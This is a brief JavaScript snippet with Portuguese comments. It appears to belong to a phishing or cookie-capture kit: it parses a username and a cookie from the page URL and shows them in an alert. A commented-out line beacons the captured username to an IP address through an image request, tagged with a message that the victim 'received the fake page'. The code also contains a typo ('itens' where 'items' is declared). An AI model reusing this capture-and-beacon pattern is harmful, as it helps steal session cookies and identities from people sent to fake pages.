//Captura todo o conteudo da URL
var url   = window.location.search.replace("?", "");

//Recupera o nome do usuario enviado por GET
var items = url.split("&");
var array = {
'usuario' : items[0],
'cookie' : itens[1]
}


//Retira o %20 referente aos espaços e substitui pos underline
//str = array.usuario
//var busca = "%20"; 
//var strbusca = eval('/'+busca+'/g');
//str2 = str.replace(strbusca, "_");

//alert('teste');

//new Image().src = "http://192.168.0.123/?=" + str2 +"_Recebeu_a_pagina_falsa_aguarde_captura....";

alert(array.usuario + ' / ' + array.cookie);


// Para Testes
//alert(str2);
//alert('captura usuario / editar arquivo captura_usuario.js')

